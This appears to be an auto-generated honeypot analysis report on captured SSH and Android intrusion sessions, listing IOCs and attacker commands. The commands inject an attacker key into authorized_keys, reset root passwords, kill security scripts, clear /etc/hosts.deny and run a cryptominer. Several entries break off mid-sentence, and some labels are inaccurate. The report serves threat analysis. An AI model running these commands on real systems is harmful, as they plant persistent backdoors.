# Honeypot Attack Analysis Report

Generated: 2025-12-16T10:49:00.918524

## Summary
- Total Sessions Analyzed: 420
- Unique Attack Patterns: 336
- Successful Analyses: 420
- Failed Analyses: 0

---


## Attack Patterns (336 unique)

### Pattern: 6e98e5bb3290...
- **Sessions**: 74
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 38
- **Sample IPs**: 45.78.218.138, 154.221.22.203, 101.47.49.79, 187.230.47.216, 103.113.105.228... (+33 more)

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain unauthorized SSH access to the system.  

**Techniques Used:**  
- `chattr -ia` & `lockr -ia` – set immutable attributes and lock files.  
- `rm -rf .ssh`, `mkdir .ssh` – recreate the SSH directory.  
- `echo "ssh-rsa … mdrfckr" > ~/.ssh/authorized_keys` – inject a public key into authorized_keys.  
- `chmod -R go= ~/.ssh` – restrict group permissions.

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.216.106**  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File path: `~/.ssh/authorized_keys`

**Threat Level:** Medium – the attacker is attempting to establish a backdoor but no malicious payload was detected.  

**Brief Summary:** The attacker removed and recreated the SSH directory, injected an unauthorized public key into authorized_keys, and restricted group permissions to enable remote SSH access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
```

---

### Pattern: 982b12c94693...
- **Sessions**: 6
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 6
- **Sample IPs**: 45.78.218.12, 101.47.161.212, 45.78.217.69, 101.47.49.79, 101.47.163.114... (+1 more)

#### Analysis

**Attack Type:** Backdoor / sabotage  
**Objective:** Prevent any future changes to the `.ssh` directory (likely to hide malicious keys or lock out legitimate users).  
**Techniques:**  
- `chattr -i` and `chattr -a` to set immutable/append‑only attributes on `/home/.ssh`.  
- Custom tool `lockr -ia .ssh` (presumably a wrapper for locking the directory).  

**Indicators of Compromise (IOCs):**  
- IP: 101.47.49.79  
- Command sequence: `cd ~; chattr -ia .ssh; lockr -ia .ssh`  
- Target file/directory: `/home/.ssh`  
- Tool name: `lockr`

**Threat Level:** Medium – the attacker is attempting to secure a critical SSH directory, potentially hiding malicious credentials or preventing legitimate access.  

**Brief Summary:** The attacker used file‑attribute commands and a custom lock tool to make the `.ssh` directory immutable and append‑only, likely to conceal or protect malicious SSH keys.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
```

---

### Pattern: c8d04f34953a...
- **Sessions**: 3
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 91.92.241.59

#### Analysis

**Attack Type:** Reconnaissance / Potential Backdoor Installation  
**Objective:** Gather system environment details (mount points, processes) before attempting to download/execute a malicious payload.  

**Techniques:**  
- Shell command chaining (`echo … | sh`) to execute multiple commands in one line.  
- Reading `/proc` information (`cat /proc/1/mounts`, `ls /proc/1/`).  
- Process enumeration (`ps aux`).  
- Custom script invocation (`curl2`) – likely a wrapper for downloading or executing payload.

**Indicators of Compromise (IOCs):**  
- Command names: `curl2`, `cat /proc/1/mounts`, `ls /proc/1/`, `ps aux`.  
- Use of shell chaining (`echo … | sh`).  

**Threat Level:** Medium – the attacker is performing reconnaissance and may attempt to install a backdoor, but no evidence of payload execution or malicious code was captured.  

**Brief Summary:** The attacker executed system‑info commands and attempted to run a custom `curl2` script, likely aiming to download or install a malicious payload after gathering environment details.

#### Sample Commands
```
echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh
cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps

curl2

```

---

### Pattern: 242e58ea6427...
- **Sessions**: 3
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 2
- **Source IPs**: 3.143.33.63, 184.105.139.69

#### Analysis

**Attack Type:**  
- **Reconnaissance / Probe** – the attacker sent minimal HTTP headers without any commands.

**Objective:**  
- The attacker likely attempted to test the honeypot’s responsiveness or gather basic information about the server (e.g., whether it supports gzip compression).

**Techniques:**  
- Simple HTTP request with `Accept-Encoding: gzip` header; no use of tools like wget, curl, SSH, or payload download.

**Indicators of Compromise (IOCs):**  
- None – no IPs, URLs, domains, file hashes, or filenames were observed in the session.

**Threat Level:**  
- **Low** – no malicious activity detected; the session appears benign.

**Brief Summary:**  
The attacker performed a minimal HTTP probe by sending `Accept-Encoding: gzip` headers, likely to test server capabilities. No evidence of malicious intent was found.

#### Sample Commands
```
Accept-Encoding: gzip
Accept-Encoding: gzip

```

---

### Pattern: 86a32d5bf517...
- **Sessions**: 2
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 2
- **Source IPs**: 173.24.18.140, 112.173.190.152

#### Analysis

**1. Attack Type:**  
Reconnaissance / potential cryptominer detection (no direct exploitation observed).

**2. Objective:**  
Identify whether the system hosts a cryptocurrency miner or other malicious processes and locate specific files/dirs that may contain backdoor payloads.

**3. Techniques & Tools Used:**
- System information gathering (`ifconfig`, `uname -a`, `/proc/cpuinfo`).
- Process enumeration with pattern matching (`ps | grep '[Mm]iner'`, `ps -ef | grep '[Mm]iner'`).
- Directory and file search (`ls -la ...`, `locate D877F783D5D3EF8Cs`).
- Echo command to test shell functionality.

**4. Indicators of Compromise (IOCs):**
- Process name containing “miner” (e.g., *miner* or *Miner*).
- Directories:  
  - `~/.local/share/TelegramDesktop/tdata`  
  - `/var/spool/sms/*`, `/var/log/smsd.log`, `/etc/smsd.conf*`  
  - `/usr/bin/qmuxd`, `/var/qmux_connect_socket`, `/etc/config/simman`, `/dev/modem*`, `/var/config/sms/*`
- File hash: `D877F783D5D3EF8Cs` (potentially a malicious payload).

**5. Threat Level:** Medium – the attacker is probing for hidden malware but no active exploitation was detected.

**6. Brief Summary:**  
The attacker performed a reconnaissance scan to detect crypto mining processes and search for specific directories that may contain backdoor or SMS-related malware, indicating a potential threat of covert mining or data exfiltration.

#### Sample Commands
```
/ip cloud print
/ip cloud print
ifconfig
uname -a
cat /proc/cpuinfo
ps | grep '[Mm]iner'
ps -ef | grep '[Mm]iner'
ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* ...
locate D877F783D5D3EF8Cs
echo Hi | cat -n
```

---

### Pattern: 4ee79e33fb67...
- **Sessions**: 2
- **Honeypot Type**: Adbhoney
- **Unique Source IPs**: 1
- **Source IPs**: 119.203.47.168

#### Analysis

**1. Attack Type:** Cryptominer installation & execution  
**2. Objective:** Deploy a cryptocurrency miner (ufo.apk) and run it as root to maximize mining throughput.  
**3. Techniques:**  
- `pm install` to load an APK onto the device.  
- `am start` to launch the app’s main activity.  
- Use of `nohup` + `su -c` to elevate privileges and hide the process.  
- Cleanup of temporary files (`rm -rf /data/local/tmp/*`) to reduce footprint.  
**4. IOCs:**  
- Attacker IP: 119.203.47.168 (South Korea)  
- Domain/Package: com.ufo.miner  
- APK filename: ufo.apk  
- Process name: trinity  
- File path: /data/local/tmp/nohup, /data/local/tmp/trinity  
**5. Threat Level:** High – root access and cryptomining can drain device resources and potentially expose sensitive data.  
**6. Summary:** The attacker installed a cryptominer APK on an Android device, executed it with elevated privileges using `nohup` and `su`, thereby enabling continuous mining activity.

#### Sample Commands
```
pm path com.ufo.miner
pm install /data/local/tmp/ufo.apk
rm -f /data/local/tmp/ufo.apk
am start -n com.ufo.miner/com.example.test.MainActivity
ps | grep trinity
rm -rf /data/local/tmp/*
chmod 0755 /data/local/tmp/nohup
chmod 0755 /data/local/tmp/trinity
/data/local/tmp/nohup su -c /data/local/tmp/trinity
/data/local/tmp/nohup /data/local/tmp/trinity
```

---

### Pattern: 16d2c6053330...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.36.113.241

#### Analysis

**Attack Type:** Backdoor installation / credential injection  
**Objective:** Gain remote SSH access by injecting an authorized‑keys entry and setting a user password; gather system information for later exploitation or reconnaissance.  

**Techniques:**  
- `chattr`/`lockr` to lock the `.ssh` directory, preventing tampering.  
- Removal/recreation of `.ssh`, writing a public RSA key into `authorized_keys`.  
- Setting a new UNIX password (`passwd`).  
- System‑info commands (`cpuinfo`, `free`, `uname`, `lscpu`, `df`) to collect host details.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.36.113.241** (Hong Kong).  
- Public RSA key string (long base‑64 block) – can be hashed or fingerprinted for detection.  
- File paths manipulated: `~/.ssh`, `authorized_keys`.  

**Threat Level:** Medium – moderate sophistication, potential to establish persistent remote access.  

**Brief Summary:** The attacker injected a public SSH key and set a password on the honeypot, enabling future remote login while collecting system metrics for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "testadmin\nhC8xTbP3NUrc\nhC8xTbP3NUrc"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "testadmin\nhC8xTbP3NUrc\nhC8xTbP3NUrc\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 813e033b5392...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.216.103

#### Analysis

**Attack Type:** Backdoor installation / credential theft  
**Objective:** Gain remote access via SSH by injecting a public key and resetting the root password.  

**Techniques Used:**  
- `chattr`/`lockr` to lock files, `chmod` to set permissions, `echo` to write an authorized_keys file with a hard‑coded RSA key.  
- `chpasswd` to change the root password (`root:7Xqi8BwQsLv2`).  
- System information gathering (CPU, memory, disk usage) for reconnaissance.

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.216.103**  
- Hard‑coded SSH public key: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Files manipulated: `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`.

**Threat Level:** **High** – the attacker successfully installed a backdoor and altered root credentials, enabling persistent remote access.

**Brief Summary:** The attacker injected an SSH key and reset the root password to establish a permanent backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:7Xqi8BwQsLv2"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 26bdba443061...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.98.176.164

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain remote access to the host by creating a valid SSH key in `~/.ssh/authorized_keys` and disabling normal permissions, thereby enabling future SSH connections from the attacker’s IP.  

**Techniques & Tools:**
- Creation of `.ssh` directory and insertion of an RSA public key (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- Use of `lockr -ia .ssh` (likely a tool to hide or lock the directory).  
- Permission manipulation with `chmod -R go= ~/.ssh`.  
- System reconnaissance commands: CPU info, memory usage, crontab, uptime (`w`), uname, lscpu, and disk space.  

**Indicators of Compromise (IOCs):**
- Attacker IP: **103.98.176.164**  
- SSH public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File path: `~/.ssh/authorized_keys`

**Threat Level:** Medium – the attacker successfully installed a backdoor but did not execute any payload or exploit beyond SSH access.

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh/authorized_keys`, manipulated permissions to hide the directory, and performed basic system reconnaissance. This indicates a remote access backdoor setup with moderate sophistication.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nS7ZL3ELvPi4V\nS7ZL3ELvPi4V"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nS7ZL3ELvPi4V\nS7ZL3ELvPi4V\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+10 more)
```

---

### Pattern: 61f405a3da27...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 95.0.252.5

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain remote access to the system by injecting an SSH key and resetting the root password.  

**Techniques & Tools Used:**  
- `chattr`/`lockr` to hide `.ssh` directory.  
- Creation of a malicious RSA public key in `authorized_keys`.  
- Password reset via `echo "root:KA7BPBdefGWv"|chpasswd|bash`.  
- Process termination (`pkill -9`) and host denial modifications.

**Indicators of Compromise (IOCs):**  
- Attacker IP: **95.0.252.5** (Türkiye).  
- RSA public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`.  
- File paths: `.ssh/authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`.

**Threat Level:** **High** – root password reset and SSH key injection provide full system access.

**Brief Summary:** The attacker injected a malicious SSH key into the honeypot, altered the root password, and attempted to conceal the `.ssh` directory, effectively installing a backdoor for remote exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:KA7BPBdefGWv"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 86be703cd4bf...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 70.54.182.130

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + root password change) with reconnaissance  
**Objective:** Gain persistent remote access by adding an authorized SSH key, changing the root password, and collecting system information to assess the target.  
**Techniques:**  
- `chattr -ia` / `lockr` to make `.ssh` immutable  
- `rm -rf .ssh && mkdir .ssh && echo … > ~/.ssh/authorized_keys` to inject a new SSH key  
- `echo "root:zsY2iSomQ

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:zsY2iSomQDrB"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 869fc66096c5...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 95.0.252.5

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection & root credential manipulation  
**Objective:** Gain privileged remote access (root) on the target machine and establish persistent control.  
**Techniques:**  
- `chattr -ia .ssh` / `lockr -ia .ssh` – make the `.ssh` directory immutable to prevent tampering.  
- Inject a malicious RSA key into `authorized_keys`.  
- Reset root password (`echo "root:VdU2PvpFo2L8"|chpasswd|bash`).  
- Remove and kill suspicious scripts/processes (`rm -rf /tmp/secure.sh`, `pkill -9 secure.sh`).  
- Gather system info (CPU, memory, OS, uptime) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **95.0.252.5** (Türkiye).  
- RSA key string in `authorized_keys` (e.g., “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”).  
- Empty `/etc/hosts.deny` file created by `echo > /etc/hosts.deny`.  

**Threat Level:** **High** – root access and persistent backdoor installation pose significant risk.  

**Brief Summary:** The attacker injected a malicious SSH key, reset the root password, made the `.ssh` directory immutable, removed potential security scripts, and collected system information to establish a high‑privilege backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:VdU2PvpFo2L8"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: c45018958ded...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 133.117.74.174

#### Analysis

**Attack Type:** Backdoor installation (SSH credential injection)

**Objective:** Gain privileged SSH access to the system by adding a malicious RSA key and setting a root password, then disabling or killing unrelated processes.

**Techniques Used:**
- Creation of `.ssh` directory and insertion of a public‑key into `authorized_keys`.
- Setting restrictive permissions (`chmod -R go= ~/.ssh`) to hide the key.
- Directly changing the root password via `chpasswd`.
- Killing processes (`pkill -9 secure.sh`, `pkill -9 auth.sh`, `pkill -9 sleep`).
- Minimal use of system commands for reconnaissance (CPU info, memory, etc.).

**Indicators of Compromise (IOCs):**
- Attacker IP: **133.117.74.174** (Japan)
- Public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`
- Root password: **jR97c2KT9yfP**

**Threat Level:** High – the attacker has established a persistent, privileged SSH backdoor and potentially can execute arbitrary commands.

**Brief Summary:** The attacker injected an RSA key into `authorized_keys`, set a root password, and disabled unrelated processes to create a stealthy SSH backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:jR97c2KT9yfP"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 4720879f390c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.98.176.164

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent root‑level access via a malicious SSH key and change the root password.  

**Techniques & Tools Used:**
- **SSH Key Injection** – `echo "ssh-rsa … mdrfckr" > ~/.ssh/authorized_keys`  
- **Immutable File Protection** – `chattr -ia .ssh; lockr -ia .ssh` (makes the `.ssh` directory immutable)  
- **Root Password Reset** – `echo "root:5ciL3ZlOTIpM"|chpasswd|bash`  
- **Process Killing & Host Deny** – `pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny`  
- **System Reconnaissance** – CPU, memory, OS info (`cat /proc/cpuinfo`, `free -m`, `uname`, etc.)  

**Indicators of Compromise (IOCs):**
- Attacker IP: 103.98.176.164 (Indonesia)  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:5ciL3ZlOTIpM"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: aa3c90d6b328...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 182.43.76.120

#### Analysis

**1. Attack Type**  
Backdoor installation via SSH key injection + system reconnaissance (possible botnet recruitment).

**2. Objective**  
Gain remote access to the machine by adding a custom SSH key, possibly set a user/password, and gather system information for further exploitation.

**3. Techniques & Tools**  
- `chattr -ia`, `lockr` – likely used to hide or lock files.  
- Removal/creation of `.ssh` directory and injection of an RSA public key into `authorized_keys`.  
- `chmod go= ~/.ssh` to restrict permissions.  
- Multiple `passwd` attempts with a custom password string.  
- System info commands (`cat /proc/cpuinfo`, `free -m`, `uname`, `top`, etc.) for reconnaissance.

**4. Indicators of Compromise (IOCs)**  
- Attacker IP: **182.43.76.120** (China).  
- SSH key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "ozzy\nb7stofE4eCGo\nb7stofE4eCGo"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "ozzy\nb7stofE4eCGo\nb7stofE4eCGo\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: f2113b091949...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.98.176.164

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Gain remote SSH access and collect system information for future exploitation.  

**Techniques:**  
- Injected an SSH public key into `~/.ssh/authorized_keys` and disabled permissions (`chmod -R go= ~/.ssh`).  
- Used `chattr`/`lockr` to hide the `.ssh` directory.  
- Attempted to create or modify a user password (`passwd` commands).  
- Gathered CPU, memory, OS, and filesystem details (e.g., `/proc/cpuinfo`, `free -m`, `uname`, `df`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 103.98.176.164  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File path: `~/.ssh/authorized_keys`

**Threat Level:** Medium‑High (backdoor with potential remote control).  

**Summary:** The attacker injected an SSH key into the honeypot’s authorized keys, disabled permissions to hide the directory, and performed extensive system reconnaissance. This indicates a backdoor installation aimed at gaining future remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "testadmin\nIQ01K12eGFQf\nIQ01K12eGFQf"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "testadmin\nIQ01K12eGFQf\nIQ01K12eGFQf\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: e564b6f40ebb...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.36.113.241

#### Analysis

**Attack Type:** Backdoor installation / remote access compromise  
